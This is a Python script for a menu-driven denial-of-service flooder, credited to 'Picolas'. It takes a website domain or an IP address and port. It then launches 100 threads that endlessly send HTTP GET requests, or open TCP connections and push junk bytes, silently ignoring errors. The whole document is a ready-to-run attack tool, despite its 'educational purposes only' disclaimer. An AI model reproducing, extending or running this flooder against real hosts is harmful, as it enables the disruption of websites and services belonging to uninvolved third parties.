import os
import socket
import threading
import time
import random
import requests
from colorama import Fore, Style, init

# Inicializa colorama
init(autoreset=True)

def print_banner():
    banner = f"""
{Fore.RED}   _____ _____ _____ _____ _____ _____ _____ _____ _____
{Fore.MAGENTA}|     |   __|   __|  |  |   __|   __|     |   __|   __|
{Fore.RED} |  |  |   __|   __|     |   __|   __|  |  |   __|   __|
{Fore.MAGENTA}|_____|_____|_____|__|__|_____|_____|_____|_____|_____|
    """
    print(banner)
    print(f"{Fore.GREEN}Author: {Style.BRIGHT}Picolas")
    print(f"{Fore.GREEN}Github: {Style.BRIGHT}https://files.catbox.moe/730d9i.png")
    print(f"{Fore.YELLOW}For legal purposes only{Style.RESET_ALL}\n")

    # Imprime el banner personalizado desde Catbox
    banner_url = "https://catbox.moe/your-image-url.png"
    print(f"{Fore.BLUE}Banner: {Style.BRIGHT}{banner_url}{Style.RESET_ALL}\n")

def attack_website(domain):
    while True:
        try:
            requests.get(f"http://{domain}")
        except:
            pass

def attack_ip(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b'X' * 1024)
            s.close()
        except:
            pass

def main():
    print_banner()
    print(f"{Fore.GREEN}1. {Style.BRIGHT}Website Domain")
    print(f"{Fore.GREEN}2. {Style.BRIGHT}IP Address")
    print(f"{Fore.GREEN}3. {Style.BRIGHT}About")
    print(f"{Fore.GREEN}4. {Style.BRIGHT}Exit\n")

    choice = input(f"{Fore.YELLOW}Select an option: {Style.RESET_ALL}")

    if choice == '1':
        domain = input(f"{Fore.YELLOW}Enter the website domain: {Style.RESET_ALL}")
        ip = socket.gethostbyname(domain)
        print(f"{Fore.GREEN}Starting attack on {domain}...")
        for _ in range(100):
            threading.Thread(target=attack_website, args=(domain,)).start()
    elif choice == '2':
        ip = input(f"{Fore.YELLOW}Enter the IP address: {Style.RESET_ALL}")
        port = int(input(f"{Fore.YELLOW}Enter the port: {Style.RESET_ALL}"))
        print(f"{Fore.GREEN}Starting attack on {ip}:{port}...")
        for _ in range(100):
            threading.Thread(target=attack_ip, args=(ip, port)).start()
    elif choice == '3':
        print(f"{Fore.GREEN}About: {Style.BRIGHT}This tool is for educational purposes only.")
    elif choice == '4':
        print(f"{Fore.YELLOW}Exiting...")
        exit()
    else:
        print(f"{Fore.RED}Invalid option. Please try again.")

if __name__ == "__main__":
    main()
